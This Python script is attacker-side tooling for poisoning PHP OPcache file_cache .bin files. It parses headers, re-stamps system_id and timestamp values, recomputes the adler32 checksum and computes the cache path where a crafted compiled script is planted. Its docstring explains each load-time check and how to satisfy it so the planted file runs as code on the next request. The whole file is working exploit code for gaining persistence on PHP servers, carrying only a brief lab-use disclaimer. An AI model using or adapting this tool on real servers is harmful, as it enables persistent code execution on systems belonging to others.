#!/usr/bin/env python3
"""OPcache file_cache (.bin) poisoning.

Scope: persistence, not bootstrap -- it needs an attacker-writable
``opcache.file_cache`` directory, not a way in on its own.

With ``opcache.file_cache`` set, compiled scripts are serialised to ``.bin``
files and loaded back instead of recompiling; a crafted/relocated ``.bin`` in an
attacker-writable cache dir runs as code on the next request. This is the
attacker-side ``.bin`` tooling: it compiles the payload with a build matching the
target's ``system_id``, parses the header, optionally re-stamps ``system_id``
(not covered by the body checksum), recomputes the adler32 body checksum when the
body is edited, and writes the exact ``<file_cache>/<system_id>/<realpath>.bin``.

The ``.bin`` header layout (ext/opcache/zend_file_cache.c, PHP 8.4.26)::

    struct _zend_file_cache_metainfo {   # offsets
        char   magic[8];                 # 0   "OPCACHE"
        char   system_id[32];            # 8   32 hex chars (md5), see below
        size_t mem_size;                 # 40
        size_t str_size;                 # 48
        size_t script_offset;            # 56
        accel_time_t timestamp;          # 64  source mtime at compile time
        uint32_t checksum;               # 72  adler32 over body
    };                                   # body = mem_size+str_size bytes, at EOF

Load-time gates (zend_file_cache_script_load):
  1. ``memcmp(info.magic, "OPCACHE", 8)``
  2. ``memcmp(info.system_id, zend_system_id, 32)``        <- the system-id gate
  3. if ``file_cache_consistency_checks``: ``adler32(body) == info.checksum``
  4. if ``validate_timestamps``: source mtime == ``info.timestamp``

``system_id`` (Zend/zend_system_id.c) is md5(PHP_VERSION + ZEND_EXTENSION_BUILD_ID
+ ZEND_BIN_ID[sizeof int/long/size_t/zend_long + ZEND_MM_ALIGNMENT] [+ __DATE__
__TIME__ for -dev builds]) then folded with per-extension entropy and a
finalize-time bitmask of overridden engine hooks (execute_ex / compile_file /
ast-process / interrupt) + registered user opcodes. Practical consequence: two
hosts share a ``system_id`` iff same PHP version, same build flags (API no, NTS/
ZTS, debug) AND the same set of hook-overriding extensions (Xdebug/ddtrace/etc.
change it). A vanilla distro ``8.4.26-fpm`` is reproducible on a sibling box.

Lab/analysis use only, on systems you own.
"""

import argparse
import struct
import sys

MAGIC = b"OPCACHE"                       # 7 bytes + NUL in an 8-byte field
MAGIC8 = MAGIC + b"\x00"

# header field offsets (see docstring)
OFF_MAGIC = 0
OFF_SYSTEM_ID = 8
OFF_MEM_SIZE = 40
OFF_STR_SIZE = 48
OFF_SCRIPT_OFFSET = 56
OFF_TIMESTAMP = 64
OFF_CHECKSUM = 72
HEADER_FIXED_END = 76                    # last field ends here (struct padded >=)

ADLER32_BASE = 65521                     # largest prime < 2^16 (zlib/zend adler)


# adler32 -- matches zend_adler32() (ext/opcache/zend_accelerator_util_funcs is
# not involved; zend_adler32 in shared_alloc is standard Adler-32, init 1).
def zend_adler32(data, init=1):
    a = init & 0xFFFF
    b = (init >> 16) & 0xFFFF
    # NMAX=5552 blocks in the C impl; folding modulo each block is equivalent to
    # folding once at the end for correctness (we are not perf-bound here).
    for byte in data:
        a = (a + byte) % ADLER32_BASE
        b = (b + a) % ADLER32_BASE
    return (b << 16) | a


class BinFile:
    """Parsed OPcache .bin: header fields + raw bytes, with edit helpers."""

    def __init__(self, raw):
        if len(raw) < HEADER_FIXED_END:
            raise ValueError("file too short to be an OPcache .bin")
        self.raw = bytearray(raw)
        self.magic = bytes(self.raw[OFF_MAGIC:OFF_MAGIC + 8])
        self.system_id = bytes(self.raw[OFF_SYSTEM_ID:OFF_SYSTEM_ID + 32])
        (self.mem_size,) = struct.unpack_from("<Q", self.raw, OFF_MEM_SIZE)
        (self.str_size,) = struct.unpack_from("<Q", self.raw, OFF_STR_SIZE)
        (self.script_offset,) = struct.unpack_from("<Q", self.raw, OFF_SCRIPT_OFFSET)
        (self.timestamp,) = struct.unpack_from("<q", self.raw, OFF_TIMESTAMP)
        (self.checksum,) = struct.unpack_from("<I", self.raw, OFF_CHECKSUM)

    # body = the trailing (mem_size + str_size) bytes, i.e. what the loader
    # mmaps as `mem` and runs adler32 over. Deriving its start from EOF is robust
    # against header struct padding differences.
    @property
    def body_len(self):
        return self.mem_size + self.str_size

    @property
    def body_start(self):
        return len(self.raw) - self.body_len

    def body(self):
        return bytes(self.raw[self.body_start:])

    def valid_magic(self):
        return self.magic[:7] == MAGIC

    def computed_checksum(self):
        return zend_adler32(self.body())

    def checksum_ok(self):
        return self.computed_checksum() == self.checksum

    # --- edits ---------------------------------------------------------------
    def set_system_id(self, sysid):
        """Re-stamp the header system_id (32 hex bytes). Does NOT touch the body
        => the body checksum stays valid, no recompute needed."""
        sysid = sysid.encode() if isinstance(sysid, str) else sysid
        if len(sysid) != 32:
            raise ValueError("system_id must be exactly 32 bytes (md5 hex)")
        self.raw[OFF_SYSTEM_ID:OFF_SYSTEM_ID + 32] = sysid
        self.system_id = bytes(sysid)

    def set_timestamp(self, ts):
        """Set the header timestamp (needed only if validate_timestamps=1 on the
        target: must equal the source file's mtime)."""
        struct.pack_into("<q", self.raw, OFF_TIMESTAMP, int(ts))
        self.timestamp = int(ts)

    def refresh_checksum(self):
        """Recompute + write the adler32 body checksum (after a body edit)."""
        c = self.computed_checksum()
        struct.pack_into("<I", self.raw, OFF_CHECKSUM, c)
        self.checksum = c
        return c

    def info(self):
        return {
            "magic": self.magic,
            "system_id": self.system_id.decode("latin1"),
            "mem_size": self.mem_size,
            "str_size": self.str_size,
            "script_offset": self.script_offset,
            "timestamp": self.timestamp,
            "checksum": self.checksum,
            "file_size": len(self.raw),
            "body_len": self.body_len,
            "magic_ok": self.valid_magic(),
            "checksum_ok": self.checksum_ok(),
        }


# cache-path derivation -- zend_file_cache_get_bin_file_path (non-Windows):
#   <file_cache>/<system_id>/<full-script-realpath>.bin
# The script realpath is appended verbatim (leading '/' included), so the path
# is file_cache + '/' + system_id + <realpath> + '.bin' with no extra separator
# before the (absolute) realpath.
def cache_path(file_cache_dir, system_id, script_realpath):
    sysid = system_id.decode() if isinstance(system_id, (bytes, bytearray)) else system_id
    fc = file_cache_dir.rstrip("/")
    rp = script_realpath
    if not rp.startswith("/"):
        rp = "/" + rp
    return "%s/%s%s.bin" % (fc, sysid, rp)


def load(path):
    with open(path, "rb") as fh:
        return BinFile(fh.read())


def poison_bin(src_bin, target_system_id=None, target_timestamp=None):
    """Load a compiled .bin, optionally re-stamp its system_id/timestamp for the
    target, and return the (possibly modified) raw bytes ready to drop."""
    b = src_bin if isinstance(src_bin, BinFile) else load(src_bin)
    if target_system_id is not None:
        b.set_system_id(target_system_id)
    if target_timestamp is not None:
        b.set_timestamp(target_timestamp)
    return bytes(b.raw), b


# CLI
def _cli(argv):
    ap = argparse.ArgumentParser(
        description=__doc__.splitlines()[0],
        formatter_class=argparse.RawDescriptionHelpFormatter)
    sub = ap.add_subparsers(dest="cmd", required=True)

    p_i = sub.add_parser("inspect", help="parse + print a .bin header")
    p_i.add_argument("bin")

    p_p = sub.add_parser("path", help="compute the loader cache path for a script")
    p_p.add_argument("file_cache_dir")
    p_p.add_argument("system_id", help="32-char md5 hex")
    p_p.add_argument("script_realpath")

    p_r = sub.add_parser("restamp", help="re-stamp system_id/timestamp of a .bin")
    p_r.add_argument("src")
    p_r.add_argument("out")
    p_r.add_argument("--system-id")
    p_r.add_argument("--timestamp", type=int)

    args = ap.parse_args(argv)

    if args.cmd == "inspect":
        b = load(args.bin)
        for k, v in b.info().items():
            print("%-14s %s" % (k, v))
        return 0

    if args.cmd == "path":
        print(cache_path(args.file_cache_dir, args.system_id, args.script_realpath))
        return 0

    if args.cmd == "restamp":
        raw, b = poison_bin(args.src, target_system_id=args.system_id,
                            target_timestamp=args.timestamp)
        with open(args.out, "wb") as fh:
            fh.write(raw)
        print("wrote %s  (system_id=%s checksum_ok=%s)"
              % (args.out, b.system_id.decode("latin1"), b.checksum_ok()))
        return 0

    return 1


if __name__ == "__main__":
    raise SystemExit(_cli(sys.argv[1:]))
